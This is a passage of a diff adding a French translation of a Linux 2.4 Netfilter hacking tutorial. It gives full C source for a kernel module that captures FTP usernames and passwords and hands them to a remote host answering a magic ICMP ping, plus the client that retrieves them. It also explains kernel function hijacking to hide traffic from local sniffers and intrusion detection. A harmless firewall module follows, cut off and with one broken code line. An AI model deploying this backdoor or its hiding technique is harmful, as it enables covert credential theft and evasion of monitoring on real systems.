+notre paquet rec,u pointe juste après l'en-tête de la couche de liaison et
+c'est ce champ data qui pointera vers le début des données du paquet que
+nous allons envoyé ( cacaburk).Ainsi pour les interfaces qui necessitent un
+en-tête de liaison (Ethernet et Loopback Point-to-Point ) , nous ferons
+pointer le champ data sur les structures mac.ethernet ou mac.raw. Pour
+determiner de quel type d'interface les paquets arrivent, nous pouvons
+tester la valeur de sb->dev->type ou` sb est un pointeur vers une structure
+sk_buff. Les valeurs possibles pour ce champ peuvent être trouvé dans
+linux/if_arp.h mais je vous donne les plus utiles dans la table 3.
+
+Table 3 : Valeurs communes des types d'interface
+
+Code du type Type d'interface
+ARPHRD_ETHER Ethernet
+ARPHRD_LOOPBACK Loopback device
+ARPHRD_PPP Point-to-point (cad modem)
+
+La derniere chose a faire est de copier les données que nous voulons
+envoyer dans notre réponse. Il est maintenant temps d'envoyer la paquet.
+La fonction dev_queue_xmit() prend comme seul argument une structure
+sk_buff et renvoie un code d'erreur négatif en cas de jolie erreur ( nice
+error). Que veux je dire par jolie erreur ? En fait, si vous donnez à
+dev_queue_xmit() un buffer de socket mal formé alors vous risquez d'avoir
+une erreur pluto^t "moche". Cela peut même aller jusqu'a un plantage du
+noyau et un dump de la pile réseau. Vous voyez mieux maintenant comment on
+peut séparer les erreurs en deux types distincts ? . Finallement,
+watch_in() va retourner NF_STOLEN afin que Netfilter oublie l'existence
+même de ce paquet (un peu comme lorsque les Jedis jouent avec l'esprit de
+leur cible). Attention : NE JAMAIS retourné NF_DROP si vous avez appelé
+dev_queue_xmit() !! Si vous faisiez cela, vous devriez avoir rapidement un
+plantage du noyau. Cela vient du fait que dev_queue_xmit() va libéré le
+buffer de la socket passé en argument et que Netfilter va essayer de faire
+la même chose. 
+
+------[ 5.2.1 - The code... nfsniff.c
+
+<++> nfsniff/nfsniff.c
+/* Simple proof-of-concept for kernel-based FTP password sniffer.
+ * A captured Username and Password pair are sent to a remote host
+ * when that host sends a specially formatted ICMP packet. Here we
+ * shall use an ICMP_ECHO packet whose code field is set to 0x5B
+ * *AND* the packet has enough
+ * space after the headers to fit a 4-byte IP address and the
+ * username and password fields which are a max. of 15 characters
+ * each plus a NULL byte. So a total ICMP payload size of 36 bytes. */
+
+ /* Written by bioforge,  March 2003 */
+
+#define MODULE
+#define __KERNEL__
+
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/skbuff.h>
+#include <linux/in.h>
+#include <linux/ip.h>
+#include <linux/tcp.h>
+#include <linux/icmp.h>
+#include <linux/netdevice.h>
+#include <linux/netfilter.h>
+#include <linux/netfilter_ipv4.h>
+#include <linux/if_arp.h>
+#include <linux/if_ether.h>
+#include <linux/if_packet.h>
+
+#define MAGIC_CODE   0x5B
+#define REPLY_SIZE   36
+
+#define ICMP_PAYLOAD_SIZE  (htons(sb->nh.iph->tot_len) \
+			       - sizeof(struct iphdr) \
+			       - sizeof(struct icmphdr))
+
+/* THESE values are used to keep the USERname and PASSword until
+ * they are queried. Only one USER/PASS pair will be held at one
+ * time and will be cleared once queried. */
+static char *username = NULL;
+static char *password = NULL;
+static int  have_pair = 0;	 /* Marks if we already have a pair */
+
+/* Tracking information. Only log USER and PASS commands that go to the
+ * same IP address and TCP port. */
+static unsigned int target_ip = 0;
+static unsigned short target_port = 0;
+
+/* Used to describe our Netfilter hooks */
+struct nf_hook_ops  pre_hook;	       /* Incoming */
+struct nf_hook_ops  post_hook;	       /* Outgoing */
+
+
+/* Function that looks at an sk_buff that is known to be an FTP packet.
+ * Looks for the USER and PASS fields and makes sure they both come from
+ * the one host as indicated in the target_xxx fields */
+static void check_ftp(struct sk_buff *skb)
+{
+   struct tcphdr *tcp;
+   char *data;
+   int len = 0;
+   int i = 0;
+   
+   tcp = (struct tcphdr *)(skb->data + (skb->nh.iph->ihl * 4));
+   data = (char *)((int)tcp + (int)(tcp->doff * 4));
+
+   /* Now, if we have a username already, then we have a target_ip.
+    * Make sure that this packet is destined for the same host. */
+   if (username)
+     if (skb->nh.iph->daddr != target_ip || tcp->source != target_port)
+       return;
+   
+   /* Now try to see if this is a USER or PASS packet */
+   if (strncmp(data, "USER ", 5) == 0) {          /* Username */
+      data += 5;
+      
+      if (username)  return;
+      
+      while (*(data + i) != '\r' && *(data + i) != '\n'
+	     && *(data + i) != '\0' && i < 15) {
+	 len++;
+	 i++;
+      }
+      
+      if ((username = kmalloc(len + 2, GFP_KERNEL)) == NULL)
+	return;
+      memset(username, 0x00, len + 2);
+      memcpy(username, data, len);
+      *(username + len) = '\0';	       /* NULL terminate */
+   } else if (strncmp(data, "PASS ", 5) == 0) {   /* Password */
+      data += 5;
+
+      /* If a username hasn't been logged yet then don't try logging
+       * a password */
+      if (username == NULL) return;
+      if (password)  return;
+      
+      while (*(data + i) != '\r' && *(data + i) != '\n'
+	     && *(data + i) != '\0' && i < 15) {
+	 len++;
+	 i++;
+      }
+
+      if ((password = kmalloc(len + 2, GFP_KERNEL)) == NULL)
+	return;
+      memset(password, 0x00, len + 2);
+      memcpy(password, data, len);
+      *(password + len) = '\0';	       /* NULL terminate */
+   } else if (strncmp(data, "QUIT", 4) == 0) {
+      /* Quit command received. If we have a username but no password,
+       * clear the username and reset everything */
+      if (have_pair)  return;
+      if (username && !password) {
+	 kfree(username);
+	 username = NULL;
+	 target_port = target_ip = 0;
+	 have_pair = 0;
+	 
+	 return;
+      }
+   } else {
+      return;
+   }
+
+   if (!target_ip)
+     target_ip = skb->nh.iph->daddr;
+   if (!target_port)
+     target_port = tcp->source;
+
+   if (username && password)
+     have_pair++;		       /* Have a pair. Ignore others until
+					* this pair has been read. */
+//   if (have_pair)
+//     printk("Have password pair!  U: %s   P: %s\n", username, password);
+}
+
+/* Function called as the POST_ROUTING (last) hook. It will check for
+ * FTP traffic then search that traffic for USER and PASS commands. */
+static unsigned int watch_out(unsigned int hooknum,
+			      struct sk_buff **skb,
+			      const struct net_device *in,
+			      const struct net_device *out,
+			      int (*okfn)(struct sk_buff *))
+{
+   struct sk_buff *sb = *skb;
+   struct tcphdr *tcp;
+   
+   /* Make sure this is a TCP packet first */
+   if (sb->nh.iph->protocol != IPPROTO_TCP)
+     return NF_ACCEPT;		       /* Nope, not TCP */
+   
+   tcp = (struct tcphdr *)((sb->data) + (sb->nh.iph->ihl * 4));
+   
+   /* Now check to see if it's an FTP packet */
+   if (tcp->dest != htons(21))
+     return NF_ACCEPT;		       /* Nope, not FTP */
+   
+   /* Parse the FTP packet for relevant information if we don't already
+    * have a username and password pair. */
+   if (!have_pair)
+     check_ftp(sb);
+   
+   /* We are finished with the packet, let it go on its way */
+   return NF_ACCEPT;
+}
+
+
+/* Procedure that watches incoming ICMP traffic for the "Magic" packet.
+ * When that is received, we tweak the skb structure to send a reply
+ * back to the requesting host and tell Netfilter that we stole the
+ * packet. */
+static unsigned int watch_in(unsigned int hooknum,
+			     struct sk_buff **skb,
+			     const struct net_device *in,
+			     const struct net_device *out,
+			     int (*okfn)(struct sk_buff *))
+{
+   struct sk_buff *sb = *skb;
+   struct icmphdr *icmp;
+   char *cp_data;		       /* Where we copy data to in reply */
+   unsigned int   taddr;	       /* Temporary IP holder */
+
+   /* Do we even have a username/password pair to report yet? */
+   if (!have_pair)
+     return NF_ACCEPT;
+     
+   /* Is this an ICMP packet? */
+   if (sb->nh.iph->protocol != IPPROTO_ICMP)
+     return NF_ACCEPT;
+   
+   icmp = (struct icmphdr *)(sb->data + sb->nh.iph->ihl * 4);
+
+   /* Is it the MAGIC packet? */
+   if (icmp->code != MAGIC_CODE || icmp->type != ICMP_ECHO
+     || ICMP_PAYLOAD_SIZE < REPLY_SIZE) {
+      return NF_ACCEPT;
+   }
+   
+   /* Okay, matches our checks for "Magicness", now we fiddle with
+    * the sk_buff to insert the IP address, and username/password pair,
+    * swap IP source and destination addresses and ethernet addresses
+    * if necessary and then transmit the packet from here and tell
+    * Netfilter we stole it. Phew... */
+   taddr = sb->nh.iph->saddr;
+   sb->nh.iph->saddr = sb->nh.iph->daddr;
+   sb->nh.iph->daddr = taddr;
+
+   sb->pkt_type = PACKET_OUTGOING;
+
+   switch (sb->dev->type) {
+    case ARPHRD_PPP:		       /* No fiddling needs doing */
+      break;
+    case ARPHRD_LOOPBACK:
+    case ARPHRD_ETHER:
+	{
+	   unsigned char t_hwaddr[ETH_ALEN];
+	   
+	   /* Move the data pointer to point to the link layer header */
+	   sb->data = (unsigned char *)sb->mac.ethernet;
+	   sb->len += ETH_HLEN; //sizeof(sb->mac.ethernet);
+	   memcpy(t_hwaddr, (sb->mac.ethernet->h_dest), ETH_ALEN);
+	   memcpy((sb->mac.ethernet->h_dest), (sb->mac.ethernet->h_source),
+		  ETH_ALEN);
+	   memcpy((sb->mac.ethernet->h_source), t_hwaddr, ETH_ALEN);
+  
+	   break;
+	}
+   };
+ 
+   /* Now copy the IP address, then Username, then password into packet */
+   cp_data = (char *)((char *)icmp + sizeof(struct icmphdr));
+   memcpy(cp_data, &target_ip, 4);
+   if (username)
+     memcpy(cp_data + 4, username, 16);
+   if (password)
+     memcpy(cp_data + 20, password, 16);
+   
+   /* This is where things will die if they are going to.
+    * Fingers crossed... */
+   dev_queue_xmit(sb);
+
+   /* Now free the saved username and password and reset have_pair */
+   kfree(username);
+   kfree(password);
+   username = password = NULL;
+   have_pair = 0;
+   
+   target_port = target_ip = 0;
+
+//   printk("Password retrieved\n");
+   
+   return NF_STOLEN;
+}
+
+int init_module()
+{
+   pre_hook.hook     = watch_in;
+   pre_hook.pf       = PF_INET;
+   pre_hook.priority = NF_IP_PRI_FIRST;
+   pre_hook.hooknum  = NF_IP_PRE_ROUTING;
+   
+   post_hook.hook     = watch_out;
+   post_hook.pf       = PF_INET;
+   post_hook.priority = NF_IP_PRI_FIRST;
+   post_hook.hooknum  = NF_IP_POST_ROUTING;
+   
+   nf_register_hook(&pre_hook);
+   nf_register_hook(&post_hook);
+   
+   return 0;
+}
+
+void cleanup_module()
+{
+   nf_unregister_hook(&post_hook);
+   nf_unregister_hook(&pre_hook);
+   
+   if (password)
+     kfree(password);
+   if (username)
+     kfree(username);
+}
+>
+
+------[ 5.2.2 - getpass.c
+
+<++> nfsniff/getpass.c
+/* getpass.c - simple utility to get username/password pair from
+ * the Netfilter backdoor FTP sniffer. Very kludgy, but effective.
+ * Mostly stripped from my source for InfoPig.
+ *
+ * Written by bioforge  -  March 2003 */
+
+#include <sys/types.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+#include <errno.h>
+#include <sys/socket.h>
+#include <netdb.h>
+#include <arpa/inet.h>
+
+#ifndef __USE_BSD
+# define __USE_BSD		       /* We want the proper headers */
+#endif
+# include <netinet/ip.h>
+#include <netinet/ip_icmp.h>
+
+/* Function prototypes */
+static unsigned short checksum(int numwords, unsigned short *buff);
+
+int main(int argc, char *argv[])
+{
+    unsigned char dgram[256];	       /* Plenty for a PING datagram */
+    unsigned char recvbuff[256];
+    struct ip *iphead = (struct ip *)dgram;
+    struct icmp *icmphead = (struct icmp *)(dgram + sizeof(struct ip));
+    struct sockaddr_in src;
+    struct sockaddr_in addr;
+    struct in_addr my_addr;
+    struct in_addr serv_addr;
+    socklen_t src_addr_size = sizeof(struct sockaddr_in);
+    int icmp_sock = 0;
+    int one = 1;
+    int *ptr_one = &one;
+    
+    if (argc < 3) {
+	fprintf(stderr, "Usage:  %s remoteIP myIP\n", argv[0]);
+	exit(1);
+    }
+
+    /* Get a socket */
+    if ((icmp_sock = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP)) < 0) {
+	fprintf(stderr, "Couldn't open raw socket! %s\n",
+		strerror(errno));
+	exit(1);
+    }
+
+    /* set the HDR_INCL option on the socket */
+    if(setsockopt(icmp_sock, IPPROTO_IP, IP_HDRINCL,
+		  ptr_one, sizeof(one)) < 0) {
+	close(icmp_sock);
+	fprintf(stderr, "Couldn't set HDRINCL option! %s\n",
+	        strerror(errno));
+	exit(1);
+    }
+    
+    addr.sin_family = AF_INET;
+    addr.sin_addr.s_addr = inet_addr(argv[1]);
+    
+    my_addr.s_addr = inet_addr(argv[2]);
+    
+    memset(dgram, 0x00, 256);
+    memset(recvbuff, 0x00, 256);
+    
+    /* Fill in the IP fields first */
+    iphead->ip_hl  = 5;
+    iphead->ip_v   = 4;
+    iphead->ip_tos = 0;
+    iphead->ip_len = 84;
+    iphead->ip_id  = (unsigned short)rand();
+    iphead->ip_off = 0;
+    iphead->ip_ttl = 128;
+    iphead->ip_p   = IPPROTO_ICMP;
+    iphead->ip_sum = 0;
+    iphead->ip_src = my_addr;
+    iphead->ip_dst = addr.sin_addr;
+    
+    /* Now fill in the ICMP fields */
+    icmphead->icmp_type = ICMP_ECHO;
+    icmphead->icmp_code = 0x5B;
+    icmphead->icmp_cksum = checksum(42, (unsigned short *)icmphead);
+    
+    /* Finally, send the packet */
+    fprintf(stdout, "Sending request...\n");
+    if (sendto(icmp_sock, dgram, 84, 0, (struct sockaddr *)&addr,
+	       sizeof(struct sockaddr)) < 0) {
+	fprintf(stderr, "\nFailed sending request! %s\n",
+		strerror(errno));
+	return 0;
+    }
+
+    fprintf(stdout, "Waiting for reply...\n");
+    if (recvfrom(icmp_sock, recvbuff, 256, 0, (struct sockaddr *)&src,
+		 &src_addr_size) < 0) {
+	fprintf(stdout, "Failed getting reply packet! %s\n",
+		strerror(errno));
+	close(icmp_sock);
+	exit(1);
+    }
+	
+    iphead = (struct ip *)recvbuff;
+    icmphead = (struct icmp *)(recvbuff + sizeof(struct ip));
+    memcpy(&serv_addr, ((char *)icmphead + 8),
+    	   sizeof (struct in_addr));
+    
+    fprintf(stdout, "Stolen for ftp server %s:\n", inet_ntoa(serv_addr));
+    fprintf(stdout, "Username:    %s\n",
+	     (char *)((char *)icmphead + 12));
+    fprintf(stdout, "Password:    %s\n",
+	     (char *)((char *)icmphead + 28));
+    
+    close(icmp_sock);
+    
+    return 0;
+}
+
+/* Checksum-generation function. It appears that PING'ed machines don't
+ * reply to PINGs with invalid (ie. empty) ICMP Checksum fields...
+ * Fair enough I guess. */
+static unsigned short checksum(int numwords, unsigned short *buff)
+{
+   unsigned long sum;
+   
+   for(sum = 0;numwords > 0;numwords--)
+     sum += *buff++;   /* add next word, then increment pointer */
+   
+   sum = (sum >> 16) + (sum & 0xFFFF);
+   sum += (sum >> 16);
+   
+   return ~sum;
+}
+>
+
+--[ 6 - Cacher le traffic réseau à Libpcap
+
+Cette partie va briévement décrire comment le noyau Linux 2.4 peut être
+hacké afin qu'un traffic précis sur le réseau soit indétectable pour un
+sniffer placé sur la machine locale. Un code réalisant ceci pour un traffic
+IPv4 venant ou allant vers une certaine IP vous est présenté à la fin de
+cette article. Après cette brève introduction, rentrons dans le vif du
+sujet
+
+----[ 6.1 - SOCK_PACKET, SOCK_RAW et Libpcap
+
+Une partie des logiciels les plus utiles pour un administrateur système
+peut être classifié sous le vague titre de "sniffer de paquets". Les deux
+examples les plus communs sont tcpdump(1) et Ethereal(1). Ces deyx
+logiciels utilisent la librairie Libpcap ( disponible ainsi que tcpdump sur
+[1] ) pour capturer les paquets brutes. Network Intrusion Detection System
+(NIDS) utilise lui aussi la librairie Libpcap. SNORT requiet aussi Libpcap,
+tout comme Libnids, une librairie utilisé dans NDIS qui propose IP
+reassembly et remontage des traces TCP (librairies disponibles en [2]) (
+prout).
+
+Sur les systèmes Linux, la librairie Libpcap utilise l'interface
+SOCK_PACKET. Ces sockets sont des socket spéciales qui peuvent être utilisé
+pour recevoir et envoyer des paquets brutes au niveau de la couche de
+liaison. On pourrait dire de nombreuses chose sur ces sockets SOCK_PACKET
+et leurs utilisation. Toutefois, comme nous nous intéressons ici sur
+comment se cacher d'elles et non pas comment les utiliser, nous invitons
+les lecteurs intéressé à lire le man 7 packet. Pour la discussion qui va
+suivre, la seule chose à comprendre est que c'est ce type de paquet que la
+Lipcap utilise pour avoir des informations sur les paquets bruts entrants
+et sortants.
+
+Quand un paquet est recu par la pile réseau du noau, un controle est
+effectué pour voir si aucune socket de type SOCK_PACKET n'est intéréssé par
+ce paquet. Si c 'est le cas, la paquet est simplement délivré à la socket
+intéréssé. Sinon la paquet va simplement continué son chemin vers TCP, UDP
+ou n'importe quel type de paquet pour lequel il est fait. La même chose
+arrive pour les paquets de type RAW_SOCK. Ces raws sockets ressemblent par
+de nombreux points aux sockets SOCK_PACKETS,à l'exception du fait qu'elles
+ne fournissent pas d'en-tête pour la couche de liaison. SYNalert est un
+exemple d'utilitaires utilisant les raw sockets, il est disponible en [3]
+(sorry about the shameless plug there ) .
+
+Maintenant, vous devriez avoir compris que les logiciels qui sniffent les
+paquets sous Linux utilisaient la librairie Libpcap. La Libpcap utilise
+l'interface SOCK_PACKET pour obtenir des paquets brutes avec les headers de
+la couche de liaison. Les raw sockets ont aussi été mentionnées comme moyen
+d'obtenir un paquet complet avec header IP à partir de l'espace
+utilisateur. La prochaine partie va maintenant discuter de comment un LKM
+peut être utilisé pour cacher du traffic réseaux à des interfaces de types
+SOCK_PACKET ou SOCK_RAW.
+
+------[ 6.2 Cacher le couteau sous le manteau
+
+Quand un paquet est rec,u et envoyé à une interface SOCK_PACKET, la
+fonction packet_recv() est appelé. Le code de cette fonction peut etre
+trouvé dans net/packet/af_packet.c . Cette fonction est chargé de faire
+passer le paquet par des filtres qui doivent être appliqué à la socket de
+destination puis de delivrer ce paquet à l'espace utilisateur ( un peu
+n'importe quoi). Pour cacher les paquets à une interface SOCK_PACKET, nous
+devons nous assurer que la fonction packet_rcv() ne soit pas appellé pour
+certains paquets. Comment faire cela ? En utilisant le bon vieux hijacking
+de fontions des familles bien sur !!!
+
+L'opération de base dans le hijacking de fonction est que, si nous
+connaissons l'addresse d'une fonction du noyau, même si elle n'est pas
+exportée, nous pouvons faire pointer cette fonction à un autre endroit afin
+d'executer notre code avant d'appeller la vraie fonction (NdT c'est tres
+perso ). Pour faire cela, nous devons commcer par sauver les premiers bytes
+de la fonction original que nous allons transformer afin de faire un saut
+vers notre propre code. En assembleur x86, cela ressemblerai à ca:
+
+movl (addresse de notre fonction), %eax
+jmp *eax
+
+La code hexadécimal généré par ce code (en substituant les zéros par
+l'addresse de votre fonction) est
+
+0xb8 0x00 0x00 0x00 0x00
+
+0xff 0xe0
+
+Si lors de l'initialisation de notre LKM, nous changeons les zeros du code
+précedent par l'addresse de notre fonction de hook, alors notre hook sera
+éxécuter en premier. Quand (si) nous voulons éxécuter la fonction
+originale, nous restaurons simplement les bytes originaux au debut de la
+fonction, appelons la fonction puis remplacons notre code de hijack ( burk
+et reburk). Simple mais puissant !!! Silvio Cesra a écrit un document
+détaillant le hijacking de fonction du noyau. Voir [4] dans les références.
+
+Maintenant pour cacher les paquets des interfaces SOCK_PACKET, nous devons
+commencer par écrire notre fonction de hook qui va vérifier si le paquet
+correspond à nos critères. Si c'est le cas, notre fonction retourne
+simplement 0 et la fontion packet_rcv() ne sera jamais appellée. Or si
+cette fonction n'est jamais appelée, alors le paquet ne sera jamais
+délivrée à l'espace utilisateur. Notez bien que ce paquet ne sera rejeté
+que pour l'interface SOCK_PACKET. Si nous voulons éviter que les paquets
+TCP soient récupérées par l'interface SOCK_PACKET, alors le serveur FTP
+utilisant des sockets TCP verront toujours les paquets . La seule chose que
+nous faisons ici est de rendre invisible le paquet pour tout sniffer se
+trouvant sur la machine locale. Le serveur FTP pourra toujours effectuer la
+la connection et la loguer.
+
+En théorie,( buh je fatigue la). La même chose peut etre réaliser avec les
+raw sockets. La seule différence est que nous devons hooké la fonction
+raw_rcv() (définie dans net/ipv4/raw.c). La prochaine partie va présenter
+et discuter le code source d'un LKM quiva hijacket les fonctions
+packet_rcv() et raw_rcv() et ainsi cacher toutes les paquets venant ou
+arrivant d'une addresse IP que nous spécifions.
+
+-[ 7 - Conclusion
+
+Si tout va bien, vous devriez maintenant avoir une compréhension de base de
+ce qu'est Netfilet, de comment l'utiliser et de ce que nous pouvons faire
+avec. Vous devez maintenant savoir comment cacher une partie du traffic
+réseau à tous logiciels sniffeurs sur la machine locale. Si vous voulez une
+archive contant les sources utilisés pour ce tutorial, envoyez moi un
+mail.J'apprecierai aussi toutes corrections, commentaires et suggestions.
+Maintenant, je vous laisse , à vous et à votre imagination, le soin de
+réaliser d'intéressants choses avec ce que je vous ai présenté.
+
+--[ A - Light-Weight Fire Wall
+---[ A.1 - Vue d'ensemble
+
+Le Light-Weight Fire Wall (LWFW) est un simple module démontrant les
+diverses techniques de filtrage de paquets présentées dans la section 4.
+LWFW propose de plus une interface de contro^le via le system call ioctl().
+
+Comme les sources de LWFW sont suffissament commentées, je me contenterai
+d'une brève vue d'ensemble de son fonctionnement. Lorsque le module LWFW
+est installé, sa première ta^che est d'essayer et d'enregistrer l'interface
+de controle. Notez bien qu'avant de pouvoir utiliser l'interface ioctl()
+de LWFW, un fichier de device de caractère doit être crée dans /dev ( a
+chier ). Si l'interface de contro^le est enregistré avec succées, le
+marqueur "in use" est effacé et la fonction de hook pour NF_IP_PRE_ROUTE
+est enregistré. La foncion clean_up() fait simplement le contraire de la
+procédure précédente.
+
+LWFW fournit trois options basiques pour filtrer les paquets. Ce sont, par
+ordre de traitement :
+-- Interface source
+-- Addresse IP source
+-- Port TCP de destination
+
+Les détails pour ces règles peuvent être fixé via l'interface ioctl().
+Quand un paquet est rec,u, LWFW va vérifier son intégrité vis à vis des
+règles qui ont été fixés. SI il correspond à une de ces règles, alors la
+fonction de hook va retourner NF_DROP et Netfilter va silencieusement
+rejeter ce paquet. Dans le cas contraire, la fonctiond e hook va retourner
+NF_ACCEPT et le paquet continuera son chemin.
+
+La dernière chose intéressante à mentionner est la gestion des statistiques
+par LWFW. Quand un paquet arrive dans la fonction de hook et que LWFW est
+activé, alors le nombre total de paquet est incrémenté. Chaque règle a son
+propre compteur qu'elle incremente au fur et à mesure que les paquets sont
+rejetés par cette règle. A noter que lorsqu'une règle est modifé , son
+compteur de paquet rejeté est mis à 0. Le programme lwfwstats utilisent
+l'IOCTL LWFW_GET_STATS pour recuperer une copie le de structure de
+statistique et afficher son contenu.
+
+----[ A.2 - The source... lwfw.c
+
+<++> lwfw/lwfw.c
+/* Light-weight Fire Wall. Simple firewall utility based on
+* Netfilter for 2.4. Designed for educational purposes.
+*
+* Written by bioforge - March 2003.
+*/
+
+#define MODULE
+#define __KERNEL__
+
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/net.h>
+#include <linux/types.h>
+#include <linux/skbuff.h>
+#include <linux/string.h>
+#include <linux/malloc.h>
+#include <linux/netdevice.h>
+#include <linux/netfilter.h>
+#include <linux/netfilter_ipv4.h>
+#include <linux/in.h>
+#include <linux/ip.h>
+#include <linux/tcp.h>
+
+#include <asm/errno.h>
+#include <asm/uaccess.h>
+
+#include "lwfw.h"
+
+/* Local function prototypes */
+static int set_if_rule(char *name);
+static int set_ip_rule(unsigned int ip);
+static int set_port_rule(unsigned short port);
+static int check_ip_packet(struct sk_buff *skb);
+static int check_tcp_packet(struct sk_buff *skb);
+static int copy_stats(struct lwfw_stats *statbuff);
+
+/* Some function prototypes to be used by lwfw_fops below. */
+static int lwfw_ioctl(struct inode *inode, struct file *file,
+unsigned int cmd, unsigned long arg);
+static int lwfw_open(struct inode *inode, struct file *file);
+static int lwfw_release(struct inode *inode, struct file *file);
+
+
+/* Various flags used by the module */
+/* This flag makes sure that only one instance of the lwfw device
+* can be in use at any one time. */
+static int lwfw_ctrl_in_use = 0;
+
+/* This flag marks whether LWFW should actually attempt rule checking.
+* If this is zero then LWFW automatically allows all packets. */
+static int active = 0;
+
+/* Specifies options for the LWFW module */
+static unsigned int lwfw_options = (LWFW_IF_DENY_ACTIVE
+| LWFW_IP_DENY_ACTIVE
+| LWFW_PORT_DENY_ACTIVE);
+
+static int major = 0; /* Control device major number */
+
+/* This struct will describe our hook procedure. */
+struct nf_hook_ops nfkiller;
+
+/* Module statistics structure */
+static struct lwfw_stats lwfw_statistics = {0, 0, 0, 0, 0};
+
+/* Actual rule 'definitions'. */
+/* TODO: One day LWFW might actually support many simultaneous rules.
+* Just as soon as I figure out the list_head mechanism... */
+static char *deny_if = NULL; /* Interface to deny */
+static unsigned int deny_ip = 0x00000000; /* IP address to deny */
+static unsigned short deny_port = 0x0000; /* TCP port to deny */
+
+/*
+* This is the interface devicés file_operations structure
+*/
+struct file_operations lwfw_fops = {
+NULL,
+NULL,
+NULL,
+NULL,
+NULL,
+NULL,
+lwfw_ioctl,
+NULL,
+lwfw_open,
+NULL,
+lwfw_release,
+NULL /* Will be NULL'ed from here... */
+};
+
+MODULE_AUTHOR("bioforge");
+MODULE_DESCRIPTION("Light-Weight Firewall for Linux 2.4");
+
+/*
+* This is the function that will be called by the hook
+*/
+unsigned int lwfw_hookfn(unsigned int hooknum,
+struct sk_buff **skb,
+const struct net_device *in,
+const struct net_device *out,
+int (*okfn)(struct sk_buff *))
+{
+unsigned int ret = NF_ACCEPT;
+
+/* If LWFW is not currently active, immediately return ACCEPT */
+if (!active)
+return NF_ACCEPT;
+
+lwfw_statistics.total_seen++;
+
+/* Check the interface rule first */
+if (deny_if && DENY_IF_ACTIVE) {
+if (strcmp(in->name, deny_if) == 0) { /* Deny this interface */
+lwfw_statistics.if_dropped++;
+lwfw_statistics.total_dropped++;
+return NF_DROP;
+}
+}
+
+/* Check the IP address rule */
+if (deny_ip && DENY_IP_ACTIVE) {
+ret = check_ip_packet(*skb);
+if (ret != NF_ACCEPT) return ret;
+}
+
+/* Finally, check the TCP port rule */
+if (deny_port && DENY_PORT_ACTIVE) {
+ret = check_tcp_packet(*skb);
+if (ret != NF_ACCEPT) return ret;
+}
+
+return NF_ACCEPT; /* We are happy to keep the packet
+*/
+}
+
+/* Function to copy the LWFW statistics to a userspace buffer */
+static int copy_stats(struct lwfw_stats *statbuff)
+{
+NULL_CHECK(statbuff);
+
+copy_to_user(statbuff, &lwfw_statistics,
+sizeof(struct lwfw_stats));
+
+return 0;
+}
+
+/* Function that compares a received TCP packet's destination port
+* with the port specified in the Port Deny Rule. If a processing
+* error occurs, NF_ACCEPT will be returned so that the packet is
+* not lost. */
+static int check_tcp_packet(struct sk_buff *skb)
+{
+/* Seperately defined pointers to header structures are used
+* to access the TCP fields because it seems that the so-called
+* transport header from skb is the same as its network header TCP
+* packets.
+* If you don't believe me then print the addresses of skb->nh.iph
+* and skb->h.th.
+* It would have been nicer if the network header only was IP and
+* the transport header was TCP but what can you do? */
+struct tcphdr *thead;
+
+/* We don't want any NULL pointers in the chain to the TCP header. */
+if (!skb ) return NF_ACCEPT;
+if (!(skb->nh.iph)) return NF_ACCEPT;
+
+/* Be sure this is a TCP packet first */
+if (skb->nh.iph->protocol != IPPROTO_TCP) {
+return NF_ACCEPT;
+}
+
+thead = (struct tcphdr *)(skb->data + (skb->nh.iph->ihl * 4));
+
+/* Now check the destination port */
+if ((thead->dest) == deny_port) {
+/* Update statistics */
+lwfw_statistics.total_dropped++;
+lwfw_statistics.tcp_dropped++;
+
+return NF_DROP;
+}
+
+return NF_ACCEPT;
+}
+
+/* Function that compares a received IPv4 packet's source address
+* with the address specified in the IP Deny Rule. If a processing
+* error occurs, NF_ACCEPT will be returned so that the packet is
+* not lost. */
+static int check_ip_packet(struct sk_buff *skb)
+{
+/* We don't want any NULL pointers in the chain to the IP header. */
+if (!skb ) return NF_ACCEPT;
+if (!(skb->nh.iph)) return NF_ACCEPT;
+
+if (skb->nh.iph->saddr == deny_ip) {/* Matches the address. Barf. */
+lwfw_statistics.ip_dropped++; /* Update the statistics */
+lwfw_statistics.total_dropped++;
+
+return NF_DROP;
+}
+
+return NF_ACCEPT;
+}
+
+static int set_if_rule(char *name)
+{
+int ret = 0;
+char *if_dup; /* Duplicate interface */
+
+/* Make sure the name is non-null */
+NULL_CHECK(name);
+
+/* Free any previously saved interface name */
+if (deny_if) {
+kfree(deny_if);
+deny_if = NULL;
+}
+
+if ((if_dup = kmalloc(strlen((char *)name) + 1, GFP_KERNEL))
+== NULL) {
+ret = -ENOMEM;
+} else {
+memset(if_dup, 0x00, strlen((char *)name) + 1);
+memcpy(if_dup, (char *)name, strlen((char *)name));
+}
+
+deny_if = if_dup;
+lwfw_statistics.if_dropped = 0; /* Reset drop count for IF rule */
+printk("LWFW: Set to deny from interface: %s\n", deny_if);
+
+return ret;
+}
+
+static int set_ip_rule(unsigned int ip)
+{
+deny_ip = ip;
+lwfw_statistics.ip_dropped = 0; /* Reset drop count for IP rule */
+
+printk("LWFW: Set to deny from IP address: %d.%d.%d.%d\n",
+ip & 0x000000FF, (ip & 0x0000FF00) >> 8,
+(ip & 0x00FF0000) >> 16, (ip & 0xFF000000) >> 24);
+
+return 0;
+}
+
+static int set_port_rule(unsigned short port)
+{
+deny_port = port;
+lwfw_statistics.tcp_dropped = 0; /* Reset drop count for TCP rule */
+
+printk("LWFW: Set to deny for TCP port: %d\n",
+((port & 0xFF00) >> 8 | (port & 0x00FF) << );
+
+return 0;
+}
+
+/*********************************************/
+/*
+* File operations functions for control device
+*/
+static int lwfw_ioctl(struct inode *inode, struct file *file,
+unsigned int cmd, unsigned long arg)
+{
+int ret = 0;
+
+switch (cmd) {
+case LWFW_GET_VERS:
+return LWFW_VERS;
+case LWFW_ACTIVATE: {
+active = 1;
+printk("LWFW: Activated.\n");
+if (!deny_if && !deny_ip && !deny_port) {
+printk("LWFW: No deny options set.\n");
+}
+break;
+}
+case LWFW_DEACTIVATE: {
+active ^= active;
+printk("LWFW: Deactivated.\n");
+break;
+}
+case LWFW_GET_STATS: {
+ret = copy_stats((struct lwfw_stats *)arg);
+break;
+}
+case LWFW_DENY_IF: {
+ret = set_if_rule((char *)arg);
+break;
+}
+case LWFW_DENY_IP: {
